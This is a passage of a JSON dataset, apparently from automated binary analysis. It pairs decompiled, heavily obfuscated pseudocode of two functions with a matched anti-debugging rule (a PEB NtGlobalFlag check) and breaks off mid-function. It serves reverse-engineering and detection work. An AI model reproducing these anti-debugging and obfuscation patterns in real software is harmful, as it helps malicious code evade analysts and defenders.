{
    "004010b0": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401616) overlaps instruction at (ram,0x00401614)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.004010b0(void)\n\n{\n    int32_t *piVar1;\n    ushort uVar2;\n    uint8_t extraout_AH;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    ushort extraout_CX;\n    ushort extraout_CX_00;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    char extraout_CH;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint extraout_ECX_06;\n    uint extraout_ECX_07;\n    uint extraout_ECX_08;\n    uint32_t extraout_ECX_09;\n    uint extraout_ECX_10;\n    uint32_t extraout_ECX_11;\n    uint extraout_ECX_12;\n    int32_t extraout_ECX_13;\n    uint extraout_ECX_14;\n    int32_t extraout_ECX_15;\n    uint extraout_ECX_16;\n    uint extraout_ECX_17;\n    ushort extraout_DX;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint extraout_EDX_02;\n    uint extraout_EDX_03;\n    uint16_t uVar6;\n    uint16_t uVar7;\n    uint32_t unaff_EBX;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint uVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint32_t *puVar13;\n    char **ppcVar14;\n    uint unaff_EBP;\n    uint32_t unaff_ESI;\n    uint uVar15;\n    uint *puVar16;\n    int32_t iVar17;\n    uint unaff_EDI;\n    uint uVar18;\n    uint uVar19;\n    uint *puVar20;\n    uint uVar21;\n    ushort in_SS;\n    uint8_t uVar22;\n    uint8_t uVar23;\n    uint8_t in_AF;\n    bool bVar24;\n    bool bVar25;\n    char cVar26;\n    uint8_t uVar27;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar28;\n    uint8_t uVar29;\n    uchar uVar30;\n    char cVar31;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar32;\n    ulong uVar33;\n    unkbyte6 Var34;\n    uint uStackY40;\n    uint uStackY36;\n    uint32_t uStackY32;\n    \n    uStackY32 = 0x4010e0;\n    fcn.00402840(0x41f5e0, 0x10, 0x406024, 10);\n    cVar28 = SCARRY4(unaff_EBX, 1);\n    cVar26 = unaff_EBX + 1 < 0;\n    uStackY32 = 0x4010ff;\n    uVar32 = fcn.00402840(0x41f5e0, 0x10, 0x406030, 0x12);\n    iVar9 = uVar32 >> 0x20;\n    if ((cVar28 != cVar26) || (uStackY32 = uStackY32 & 0xffff | extraout_ECX << 0x10,  cVar28 == cVar26)) {\n        uStackY32 = 4;\n        uStackY36 = 0x406044;\n        uStackY40 = 0x10;\n    }\n    uVar11 = &stack0xffffffd8 ^ *(unaff_EBX + 0x6a);\n    *(uVar11 - 3) = unaff_ESI & 0xffffff00 | unaff_ESI + 0x68;\n    *(uVar11 - 7) = extraout_ECX;\n    *(uVar11 - 0xb) = iVar9;\n    *(uVar11 - 0xf) = unaff_EBX;\n    *(uVar11 - 0x13) = uVar11 + 1;\n    *(uVar11 - 0x17) = unaff_EBP;\n    *(uVar11 - 0x1b) = uVar32;\n    *(uVar11 - 0x1f) = unaff_EDI;\n    pcVar5 = iVar9 + 0x10;\n    *pcVar5 = *pcVar5 + (extraout_ECX >> 8);\n    *(uVar11 - 0x23) = 0x41f5e0;\n    *(uVar11 - 0x27) = 0x401127;\n    fcn.00402840(*(uVar11 - 0x23), *(uVar11 - 0x1f), *(uVar11 - 0x1b), *(uVar11 - 0x17));\n    *(uVar11 - 7) = extraout_EDX;\n    *(uVar11 - 9) = unaff_EBX;\n    uVar6 = *(uVar11 - 9);\n    *(uVar11 - 7) = 0xc;\n    *(uVar11 - 0xb) = str.gDI_;\n    *(uVar11 - 0xf) = 0x10;\n    *(uVar11 - 0x13) = 0x41f5e0;\n    *(uVar11 - 0x17) = 0x40115e;\n    uVar33 = fcn.00402840(*(uVar11 - 0x13), *(uVar11 - 0xf), *(uVar11 - 0xb), *(uVar11 - 7));\n    *(uVar11 - 7) = uVar33;\n    *(uVar11 - 0xb) = extraout_ECX_00;\n    *(uVar11 - 0xf) = uVar33 >> 0x20;\n    *(uVar11 - 0x13) = (unaff_EBX >> 8 & 0xffff00) << 8 | uVar6;\n    *(uVar11 - 0x17) = uVar11 - 3;\n    *(uVar11 - 0x1b) = unaff_EBP;\n    *(uVar11 - 0x1f) = uVar32;\n    *(uVar11 - 0x23) = unaff_EDI;\n    uVar18 = *(uVar11 - 0x23);\n    uVar15 = *(uVar11 - 0x1f);\n    uVar8 = *(uVar11 - 0x13);\n    *(uVar11 - 7) = 7;\n    *(uVar11 - 0xb) = str.Qr;\n    *(uVar11 - 0xf) = 0x10;\n    *(uVar11 - 0x13) = 0x41f5e0;\n    *(uVar11 - 0x17) = 0x401187;\n    fcn.00402840(*(uVar11 - 0x13), *(uVar11 - 0xf), *(uVar11 - 0xb), *(uVar11 - 7));\n    *(uVar11 - 7) = extraout_EDX_00;\n    *(uVar11 - 9) = uVar8;\n    uVar7 = *(uVar11 - 9);\n    *(uVar11 - 7) = 0xb;\n    *(uVar11 - 0xb) = str.N_I0;\n    *(uVar11 - 0xf) = 0x10;\n    *(uVar11 - 0x13) = 0x41f5e0;\n    *(uVar11 - 0x17) = 0x4011ac;\n    uVar2 = fcn.00402840(*(uVar11 - 0x13), *(uVar11 - 0xf), *(uVar11 - 0xb), *(uVar11 - 7));\n    *(uVar11 - 7) = extraout_ECX_01;\n    *(uVar11 - 0xb) = uVar18;\n    *(uVar11 - 0xd) = uVar2;\n    uVar18 = *(uVar11 - 0xb);\n    *(uVar11 - 7) = 0xc;\n    *(uVar11 - 0xb) = 0x406068;\n    *(uVar11 - 0xf) = 0x10;\n    *(uVar11 - 0x13) = 0x41f5e0;\n    *(uVar11 - 0x17) = 0x4011e7;\n    uVar6 = fcn.00402840(*(uVar11 - 0x13), *(uVar11 - 0xf), *(uVar11 - 0xb), *(uVar11 - 7));\n    *(uVar11 - 7) = extraout_EDX_01;\n    *(uVar11 - 0xb) = uVar18;\n    bVar24 = (uVar6 & 0x11cb) == 0;\n    *(uVar11 - 7) = 8;\n    *(uVar11 - 0xb) = 0x406074;\n    *(uVar11 - 0xf) = 0x10;\n    puVar12 = uVar11 - 0x13;\n    *(uVar11 - 0x13) = 0x41f5e0;\n    *(uVar11 - 0x17) = 0x40121b;\n    fcn.00402840(*(uVar11 - 0x13), *(uVar11 - 0xf), *(uVar11 - 0xb), *(uVar11 - 7));\n    if ((bVar24) || (*(uVar11 - 0x15) = extraout_CX,  !bVar24)) {\n        puVar12 = uVar11 - 0x17;\n        *(uVar11 - 0x17) = 0xd;\n    }\n    *(puVar12 + -1) = in_SS;\n    uVar19 = puVar12[-1];\n    puVar12[-1] = 0x47;\n    puVar12[-2] = 0x40607c;\n    puVar12[-3] = 0x10;\n    puVar12[-4] = 0x41f5e0;\n    puVar12[-5] = 0x40123f;\n    fcn.00402840(puVar12[-4], puVar12[-3], puVar12[-2], puVar12[-1]);\n    puVar12[3] = uVar8 & 0xffff0000 | uVar7;\n    uVar8 = puVar12[3];\n    puVar12[3] = 0x18;\n    puVar12[2] = str.D_7;\n    puVar12[1] = 0x10;\n    *puVar12 = 0x41f5e0;\n    puVar12[-1] = 0x40126a;\n    uVar18 = fcn.00402840(*puVar12, puVar12[1], puVar12[2], puVar12[3]);\n    puVar12[3] = uVar18;\n    puVar12[2] = uVar19;\n    puVar12[1] = uVar15;\n    puVar16 = puVar12[1];\n    puVar20 = puVar12[2];\n    puVar12[3] = 0x25;\n    puVar12[2] = 0x4060a4;\n    puVar12[1] = 0x10;\n    *puVar12 = 0x41f5e0;\n    puVar12[-1] = 0x40128a;\n    fcn.00402840(*puVar12, puVar12[1], puVar12[2], puVar12[3]);\n    puVar12[3] = extraout_ECX_02;\n    puVar12[2] = extraout_EDX_02;\n    puVar12[3] = 10;\n    puVar12[2] = str.tB_;\n    puVar12[1] = 0x10;\n    *puVar12 = 0x41f5e0;\n    puVar12[-1] = 0x4012af;\n    fcn.00402840(*puVar12, puVar12[1], puVar12[2], puVar12[3]);\n    puVar12[3] = extraout_ECX_03;\n    *(puVar12 + 10) = extraout_DX;\n    bVar24 = false;\n    bVar25 = ((extraout_ECX_03 >> 8 ^ extraout_AH) + 1 & 0x27) == 0;\n    puVar12[3] = 0xc;\n    puVar12[2] = 0x4060d8;\n    puVar12[1] = 0x10;\n    *puVar12 = 0x41f5e0;\n    puVar12[-1] = 0x4012d9;\n    uVar32 = fcn.00402840(*puVar12, puVar12[1], puVar12[2], puVar12[3]);\n    puVar3 = uVar32;\n    if ((bVar24 || bVar25) || (uVar8 = uVar8 & 0xffff00ff,  !bVar24 && !bVar25)) {\n        puVar12[-1] = 0xd;\n        puVar12[-2] = 0x4060e4;\n        puVar12[-3] = 0x10;\n    }\n    *puVar20 = *puVar16;\n    pcVar5 = (uVar32 >> 0x20) + 0x10;\n    *pcVar5 = *pcVar5 + extraout_CH;\n    puVar3[-1] = 0x41f5e0;\n    puVar3[-2] = 0x401306;\n    uVar32 = fcn.00402840(puVar3[-1], *puVar3, puVar3[1], puVar3[2]);\n    puVar3[6] = uVar32;\n    puVar3[5] = extraout_ECX_04;\n    puVar3[4] = uVar32 >> 0x20;\n    puVar3[3] = uVar8 & 0xffff0000 | CONCAT11(0xdf, uVar8);\n    puVar3[2] = puVar3 + 7;\n    puVar3[1] = 0x6ae181d0;\n    *puVar3 = puVar16 + 1;\n    puVar3[-1] = puVar20 + 1;\n    bVar24 = extraout_ECX_04 >> 8 == '\\x06';\n    uVar8 = *puVar3;\n    uVar18 = puVar3[1];\n    uVar15 = puVar3[3];\n    puVar3[6] = 6;\n    puVar3[5] = \"bWQ\u0450D\";\n    puVar3[4] = 0x10;\n    puVar13 = puVar3 + 3;\n    puVar3[3] = 0x41f5e0;\n    puVar3[2] = 0x401338;\n    uVar4 = fcn.00402840(puVar3[3], puVar3[4], puVar3[5], puVar3[6]);\n    if ((bVar24) || (*(puVar3 + 10) = extraout_CX_00,  !bVar24)) {\n        puVar13 = puVar3 + 2;\n        puVar3[2] = 5;\n    }\n    *(puVar13 + -1) = in_SS;\n    uVar19 = puVar13[-1];\n    puVar13[-1] = 0x47;\n    cVar28 = '\\0';\n    cVar26 = '\\0';\n    bVar24 = (uVar4 & 0x56a18c5) == 0;\n    puVar13[-2] = 0x4060fc;\n    puVar13[-3] = 0x10;\n    puVar13[-4] = 0x41f5e0;\n    puVar13[-5] = 0x40135c;\n    fcn.00402840(puVar13[-4], puVar13[-3], puVar13[-2], puVar13[-1]);\n    if (!bVar24 && cVar28 == cVar26) {\n        *(puVar13 + -0x12) = uVar8;\n        uVar8 = uVar8 & 0xffff0000 | *(puVar13 + -0x12);\n    }\n    puVar13[-5] = 0xd;\n    puVar13[-6] = str.QMI;\n    puVar13[-7] = 0x10;\n    puVar13[-8] = 0x41f5e0;\n    puVar13[-9] = 0x40137b;\n    fcn.00402840(puVar13[-8], puVar13[-7], puVar13[-6], puVar13[-5]);\n    puVar13[3] = extraout_ECX_05;\n    puVar13[2] = extraout_EDX_03;\n    puVar13[3] = 0x19;\n    puVar13[2] = str.mNJ_;\n    puVar13[1] = 0x10;\n    *puVar13 = 0x41f5e0;\n    puVar13[-1] = 0x4013b0;\n    uVar32 = fcn.00402840(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    puVar13[3] = uVar32;\n    puVar13[2] = extraout_ECX_06;\n    puVar13[1] = uVar32 >> 0x20;\n    *puVar13 = uVar15;\n    puVar13[-1] = puVar13 + 4;\n    puVar13[-2] = uVar18;\n    puVar13[-3] = uVar8;\n    puVar13[-4] = uVar19;\n    uVar19 = puVar13[-4];\n    iVar17 = puVar13[-3];\n    uVar18 = puVar13[-2];\n    iVar9 = *puVar13;\n    puVar13[3] = 0xf;\n    puVar13[2] = str.hXV_;\n    puVar13[1] = 0x10;\n    *puVar13 = 0x41f5e0;\n    puVar13[-1] = 0x4013d9;\n    uVar15 = fcn.00402840(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    puVar13[3] = uVar15;\n    bVar24 = false;\n    bVar25 = uVar15 == iVar9;\n    puVar13[3] = 0xe;\n    puVar13[2] = str.iYW_;\n    puVar13[1] = 0x10;\n    *puVar13 = 0x41f5e0;\n    puVar13[-1] = 0x4013f4;\n    pcVar5 = fcn.00402840(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    if ((!bVar25) && (bVar25)) {\n        iVar9 = iVar9 + 1;\n        uVar22 = pcVar5;\n        if (bVar24 || iVar9 == 0) {\n            *pcVar5 = *pcVar5 + uVar22;\n        }\n        else {\n            in_AF = 9 < (uVar22 & 0xf) | in_AF;\n            piVar1 = (pcVar5 & 0xffff0000 | CONCAT11((pcVar5 >> 8) + in_AF, uVar22 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar1 = *piVar1 - iVar9;\n            iVar17 = iVar17 + 1;\n        }\n    }\n    puVar13[-1] = 0xd;\n    puVar13[-2] = str.vGZ;\n    puVar13[-3] = 0x10;\n    puVar13[-4] = 0x41f5e0;\n    puVar13[-5] = 0x40141b;\n    fcn.00402840(puVar13[-4], puVar13[-3], puVar13[-2], puVar13[-1]);\n    puVar13[3] = extraout_ECX_07;\n    puVar13[3] = 0xc;\n    puVar13[2] = 0x406160;\n    puVar13[1] = 0x10;\n    *puVar13 = 0x41f5e0;\n    puVar13[-1] = 0x40144f;\n    uVar15 = fcn.00402840(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    puVar13[3] = uVar15;\n    puVar13[2] = uVar19;\n    uVar19 = puVar13[2];\n    puVar13[3] = 0xf;\n    puVar13[2] = 0x40616c;\n    puVar13[1] = 0x10;\n    *puVar13 = 0x41f5e0;\n    puVar13[-1] = 0x401486;\n    uVar2 = fcn.00402840(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    *(puVar13 + 0xe) = uVar2;\n    *(puVar13 + 10) = extraout_ECX_08;\n    *(puVar13 + 6) = iVar17;\n    uVar15 = *(puVar13 + 6);\n    puVar13[3] = 0xb;\n    puVar13[2] = 0x40617c;\n    puVar13[1] = 0x10;\n    *puVar13 = 0x41f5e0;\n    puVar13[-1] = 0x4014a6;\n    uVar8 = fcn.00402840(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    puVar13[3] = uVar8;\n    uVar22 = uVar8 < extraout_ECX_09;\n    uVar29 = SBORROW4(uVar8, extraout_ECX_09);\n    uVar8 = uVar8 - extraout_ECX_09;\n    uVar27 = uVar8 < 0;\n    bVar24 = uVar8 == 0;\n    uVar23 = (POPCOUNT(uVar8 & 0xff) & 1U) == 0;\n    puVar13[3] = 0xb;\n    puVar13[2] = 0x406188;\n    puVar13[1] = 0x10;\n    *puVar13 = 0x41f5e0;\n    puVar13[-1] = 0x4014c2;\n    fcn.00402840(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    if ((!bVar24) && (puVar13[-1] = extraout_ECX_10,  bVar24)) {\n        puVar13[-1] = (in_NT & 1) * 0x4000 | (uVar29 & 1) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                      (uVar27 & 1) * 0x80 | (bVar24 & 1) * 0x40 | (in_AF & 1) * 0x10 | (uVar23 & 1) * 4 | uVar22 & 1 |\n                      (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n        in_AF = (puVar13[-1] & 0x10U) != 0;\n    }\n    puVar13[-1] = 0xb;\n    puVar13[-2] = 0x406194;\n    puVar13[-3] = 0x10;\n    puVar13[-4] = 0x41f5e0;\n    puVar13[-5] = 0x4014e1;\n    Var34 = fcn.00402840(puVar13[-4], puVar13[-3], puVar13[-2], puVar13[-1]);\n    puVar13[3] = Var34;\n    *(puVar13 + 10) = Var34 >> 0x20;\n    puVar13[3] = 10;\n    puVar13[2] = str.TAY;\n    puVar13[1] = 0x10;\n    *puVar13 = 0x41f5e0;\n    puVar13[-1] = 0x4014fe;\n    uVar32 = fcn.00402840(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    uVar4 = uVar32 >> 0x20;\n    puVar13[3] = uVar32;\n    puVar13[2] = extraout_ECX_11;\n    puVar13[1] = uVar4;\n    *puVar13 = iVar9;\n    puVar13[-1] = puVar13 + 4;\n    puVar13[-2] = uVar18;\n    puVar13[-3] = uVar15;\n    puVar13[-4] = uVar19;\n    uVar8 = extraout_ECX_11 & 0xffff0000 | CONCAT11((extraout_ECX_11 >> 8) - iVar9, extraout_ECX_11);\n    bVar24 = uVar8 < uVar4;\n    bVar25 = uVar8 == uVar4;\n    uVar21 = puVar13[-4];\n    uVar19 = puVar13[-3];\n    uVar18 = puVar13[-2];\n    uVar15 = *puVar13;\n    puVar13[3] = 0xc;\n    puVar13[2] = 0x4061ac;\n    puVar13[1] = 0x10;\n    *puVar13 = 0x41f5e0;\n    puVar13[-1] = 0x401527;\n    fcn.00402840(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    if (!bVar24 && !bVar25) {\n        puVar13[-1] = uVar19;\n        uVar19 = puVar13[-1];\n        if (bVar24 || bVar25) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    puVar13[-1] = 0xe;\n    puVar13[-2] = str.pEL_;\n    puVar13[-3] = 0x10;\n    puVar13[-4] = 0x41f5e0;\n    puVar13[-5] = 0x401544;\n    uVar32 = fcn.00402840(puVar13[-4], puVar13[-3], puVar13[-2], puVar13[-1]);\n    puVar13[3] = uVar32;\n    puVar13[2] = extraout_ECX_12;\n    puVar13[1] = uVar32 >> 0x20;\n    *puVar13 = uVar15;\n    puVar13[-1] = puVar13 + 4;\n    puVar13[-2] = uVar18;\n    puVar13[-3] = uVar19;\n    puVar13[-4] = uVar21;\n    cVar26 = (extraout_ECX_12 >> 8) + -1;\n    uVar30 = SBORROW1(cVar26, '\\x05');\n    bVar24 = cVar26 == '\\x05';\n    uVar21 = puVar13[-4];\n    uVar19 = puVar13[-3];\n    uVar18 = puVar13[-2];\n    uVar15 = *puVar13;\n    puVar13[3] = 0x11;\n    puVar13[2] = str.oZS;\n    puVar13[1] = 0x10;\n    *puVar13 = 0x41f5e0;\n    puVar13[-1] = 0x401576;\n    fcn.00402840(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    if ((!bVar24) && (bVar24)) {\n        uVar30 = SCARRY4(puVar13, 1);\n        puVar13 = puVar13 + 1;\n    }\n    puVar13[-1] = 0x13;\n    puVar13[-2] = str.mXQ_;\n    puVar13[-3] = 0x10;\n    puVar13[-4] = 0x41f5e0;\n    puVar13[-5] = 0x401592;\n    fcn.00402840(puVar13[-4], puVar13[-3], puVar13[-2], puVar13[-1]);\n    if (!uVar30) {\n        puVar13[-5] = uVar19;\n        uVar19 = puVar13[-5];\n        if (uVar30) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    puVar13[-5] = 0x14;\n    puVar13[-6] = str.j_V8;\n    puVar13[-7] = 0x10;\n    puVar13[-8] = 0x41f5e0;\n    puVar13[-9] = 0x4015bd;\n    uVar32 = fcn.00402840(puVar13[-8], puVar13[-7], puVar13[-6], puVar13[-5]);\n    puVar13[3] = uVar32;\n    puVar13[2] = uVar15;\n    puVar13[1] = uVar32 >> 0x20;\n    uVar15 = puVar13[2];\n    puVar13[3] = 0x33;\n    puVar13[2] = 0x406204;\n    puVar13[1] = 0x10;\n    *puVar13 = 0x41f5e0;\n    puVar13[-1] = 0x4015e4;\n    uVar2 = fcn.00402840(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    puVar13[3] = uVar15;\n    *(puVar13 + 10) = uVar2;\n    uVar10 = puVar13[3];\n    puVar13[3] = 10;\n    puVar13[2] = 0x406238;\n    puVar13[1] = 0x10;\n    *puVar13 = 0x41f5e0;\n    puVar13[-1] = 0x401619;\n    uVar15 = fcn.00402840(*puVar13, puVar13[1], puVar13[2], puVar13[3]);\n    puVar13[3] = uVar15;\n    puVar13[2] = uVar10;\n    iVar9 = extraout_ECX_13;\n    ppcVar14 = puVar13 + 2;\n    while( true ) {\n        ppcVar14[-1] = iVar9;\n        uVar15 = *ppcVar14;\n        ppcVar14[1] = 0x4;\n        *ppcVar14 = 0x406244;\n        ppcVar14[-1] = 0x10;\n        ppcVar14[-2] = 0x41f5e0;\n        ppcVar14[-3] = 0x401638;\n        uVar32 = fcn.00402840(ppcVar14[-2], ppcVar14[-1], *ppcVar14, ppcVar14[1]);\n        ppcVar14[1] = uVar32;\n        *ppcVar14 = extraout_ECX_14;\n        ppcVar14[-1] = uVar32 >> 0x20;\n        ppcVar14[-2] = uVar15;\n        ppcVar14[-3] = ppcVar14 + 2;\n        ppcVar14[-4] = uVar18;\n        ppcVar14[-5] = uVar19;\n        ppcVar14[-6] = uVar21;\n        uVar15 = ppcVar14[-6];\n        uVar19 = ppcVar14[-5];\n        uVar18 = ppcVar14[-4];\n        iVar9 = ppcVar14[-2];\n        ppcVar14[1] = 0x5;\n        *ppcVar14 = 0x406248;\n        ppcVar14[-1] = 0x10;\n        ppcVar14[-2] = 0x41f5e0;\n        ppcVar14[-3] = 0x40166a;\n        uVar32 = fcn.00402840(ppcVar14[-2], ppcVar14[-1], *ppcVar14, ppcVar14[1]);\n        ppcVar14[1] = uVar32;\n        *ppcVar14 = uVar32 >> 0x20;\n        ppcVar14[-1] = uVar15;\n        cVar26 = uVar32 >> 0x20;\n        cVar28 = uVar32 >> 0x28;\n        cVar31 = SCARRY1(cVar26, cVar28);\n        cVar26 = cVar26 + cVar28;\n        cVar28 = cVar26 < '\\0';\n        bVar24 = cVar26 == '\\0';\n        uVar21 = ppcVar14[-1];\n        ppcVar14[1] = 0x6;\n        *ppcVar14 = \"XMT\u019cD\";\n        ppcVar14[-1] = 0x10;\n        ppcVar14[-2] = 0x41f5e0;\n        ppcVar14[-3] = 0x401688;\n        uVar8 = fcn.00402840(ppcVar14[-2], ppcVar14[-1], *ppcVar14, ppcVar14[1]);\n        if ((bVar24 || cVar31 != cVar28) || (!bVar24 && cVar31 == cVar28)) break;\n        in_AF = 9 < (uVar8 & 0xf) | in_AF;\n        uVar22 = uVar8 + in_AF * '\\x06';\n        if (extraout_ECX_15 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        pcVar5 = iVar9 + 0x535010c4;\n        *pcVar5 = *pcVar5 + (uVar22 & 0xf) + *(uVar8 & 0xffff0000 | CONCAT11((uVar8 >> 8) + in_AF, uVar22) & 0xff0f) +\n                            in_AF;\n        iVar9 = extraout_ECX_15;\n        ppcVar14 = ppcVar14 + -2;\n    }\n    ppcVar14[-3] = 0xc;\n    ppcVar14[-4] = str.HAV_;\n    ppcVar14[-5] = 0x10;\n    ppcVar14[-6] = 0x41f5e0;\n    ppcVar14[-7] = 0x4016ad;\n    uVar32 = fcn.00402840(ppcVar14[-6], ppcVar14[-5], ppcVar14[-4], ppcVar14[-3]);\n    ppcVar14[1] = uVar32;\n    *ppcVar14 = extraout_ECX_16;\n    ppcVar14[-1] = uVar32 >> 0x20;\n    ppcVar14[-2] = iVar9;\n    ppcVar14[-3] = ppcVar14 + 2;\n    ppcVar14[-4] = uVar18;\n    ppcVar14[-5] = uVar19;\n    ppcVar14[-6] = uVar21;\n    ppcVar14[1] = 0xc;\n    *ppcVar14 = str.hai;\n    ppcVar14[-1] = 0x10;\n    ppcVar14[-2] = 0x41f5e0;\n    ppcVar14[-3] = 0x4016d3;\n    uVar32 = fcn.00402840(ppcVar14[-2], ppcVar14[-1], *ppcVar14, ppcVar14[1]);\n    ppcVar14[1] = uVar32;\n    *ppcVar14 = extraout_ECX_17;\n    ppcVar14[-1] = uVar32 >> 0x20;\n    ppcVar14[1] = 0x2a;\n    *ppcVar14 = 0x40629c;\n    ppcVar14[-1] = 0x10;\n    ppcVar14[-2] = 0x41f5e0;\n    ppcVar14[-3] = 0x401712;\n    fcn.00402840(ppcVar14[-2], ppcVar14[-1], *ppcVar14, ppcVar14[1]);\n    ppcVar14[-3] = 0xb;\n    ppcVar14[-4] = str.oZi;\n    ppcVar14[-5] = 0x10;\n    ppcVar14[-6] = 0x41f5e0;\n    ppcVar14[-7] = 0x40173c;\n    fcn.00402840(ppcVar14[-6], ppcVar14[-5], ppcVar14[-4], ppcVar14[-3]);\n    ppcVar14[-7] = 0x41;\n    ppcVar14[-8] = 0x406324;\n    ppcVar14[-9] = 0x10;\n    ppcVar14[-10] = 0x41f5e0;\n    ppcVar14[-0xb] = 0x40174f;\n    fcn.00402840(ppcVar14[-10], ppcVar14[-9], ppcVar14[-8], ppcVar14[-7]);\n    ppcVar14[-0xb] = 0x33;\n    ppcVar14[-0xc] = str.GZV_;\n    ppcVar14[-0xd] = 0x10;\n    ppcVar14[-0xe] = 0x41f5e0;\n    ppcVar14[-0xf] = 0x401762;\n    fcn.00402840(ppcVar14[-0xe], ppcVar14[-0xd], ppcVar14[-0xc], ppcVar14[-0xb]);\n    ppcVar14[1] = 0x4b;\n    *ppcVar14 = 0x40639c;\n    ppcVar14[-1] = 0x10;\n    ppcVar14[-2] = 0x41f5e0;\n    ppcVar14[-3] = 0x401778;\n    fcn.00402840(ppcVar14[-2], ppcVar14[-1], *ppcVar14, ppcVar14[1]);\n    ppcVar14[-3] = 0x39;\n    ppcVar14[-4] = str.MP;\n    ppcVar14[-5] = 0x10;\n    ppcVar14[-6] = 0x41f5e0;\n    ppcVar14[-7] = 0x40178b;\n    fcn.00402840(ppcVar14[-6], ppcVar14[-5], ppcVar14[-4], ppcVar14[-3]);\n    ppcVar14[-7] = 0x8;\n    ppcVar14[-8] = 0x406424;\n    ppcVar14[-9] = 0x10;\n    ppcVar14[-10] = 0x41f5e0;\n    ppcVar14[-0xb] = 0x40179e;\n    fcn.00402840(ppcVar14[-10], ppcVar14[-9], ppcVar14[-8], ppcVar14[-7]);\n    ppcVar14[-0xb] = 0x14;\n    ppcVar14[-0xc] = 0x40642c;\n    ppcVar14[-0xd] = 0x10;\n    ppcVar14[-0xe] = 0x41f5e0;\n    ppcVar14[-0xf] = 0x4017b1;\n    fcn.00402840(ppcVar14[-0xe], ppcVar14[-0xd], ppcVar14[-0xc], ppcVar14[-0xb]);\n    return;\n}\n",
        "token_count": 9453
    },
    "004017c0": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b42) overlaps instruction at (ram,0x00401b3d)\n// \n\nvoid fcn.004017c0(void)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    char extraout_CH;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint8_t extraout_DL;\n    char extraout_DH;\n    uint8_t *unaff_EBX;\n    uint32_t unaff_EBP;\n    uint32_t arg_10h;\n    int32_t unaff_ESI;\n    int32_t **unaff_EDI;\n    uchar uVar8;\n    char cVar9;\n    uchar uVar10;\n    bool bVar11;\n    uint unaff_retaddr;\n    uint arg_14h;\n    uint in_stack_ffffffcc;\n    uint uVar12;\n    int32_t *arg_ch;\n    uint *puVar13;\n    \n    fcn.00402840(0x41f5e0, 0x10, 0x406010, 0x11);\n    fcn.00402840(0x41f5e0, 0x10, 0x406270, 0xd);\n    fcn.00402840(0x41f5e0, 0x10, 0x406280, 0x1a);\n    fcn.00402840(0x41f5e0, 0x10, 0x4062d4, 10);\n    fcn.00402840(0x41f5e0, 0x10, 0x4062e0, 0xb);\n    uVar8 = extraout_DL < 0x51;\n    uVar10 = extraout_DL + 0xaf < '\\0';\n    cVar9 = extraout_DL == 0x51;\n    fcn.00402840(0x41f5e0, 0x10, 0x4062ec, 8);\n    if ((!uVar8 && !cVar9) && (uVar8 || cVar9)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    do {\n        uVar12 = 0x401915;\n        fcn.00402840(0x41f5e0, 0x10, 0x4062f4, 0x41f5e0);\n        if ((uVar8) || (!uVar8)) {\n            uVar12 = 9;\n            in_stack_ffffffcc = 0x406300;\n            goto code_r0x00401935;\n        }\n    } while (extraout_ECX != 1 && cVar9 != '\\0');\n    *unaff_EDI = unaff_ESI + 4;\n    puVar3 = *0x9750e2b5;\n    **0x9750e2b5 = **0x9750e2b5 | unaff_EBP;\n    uVar10 = *puVar3 < 0;\n    *puVar3 = *puVar3;\ncode_r0x00401935:\n    arg_14h = 0x401941;\n    iVar5 = fcn.00402840(0x41f5e0, 0x10, in_stack_ffffffcc, uVar12);\n    if ((uVar10) || (!uVar10)) {\n        arg_14h = 9;\n    }\n    piVar6 = iVar5 + -0x1bf31dd6;\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    fcn.00402840(0x41f5e0, 0x10, 0x40630c, arg_14h);\n    fcn.00402840(0x41f5e0, 0x10, str.ZKUt, 0xc);\n    fcn.00402840(0x41f5e0, 0x10, 0x406440, 3);\n    bVar11 = SBORROW2(unaff_EDI, 1);\n    puVar13 = 0x41f5e0;\n    fcn.00402840(0x41f5e0, 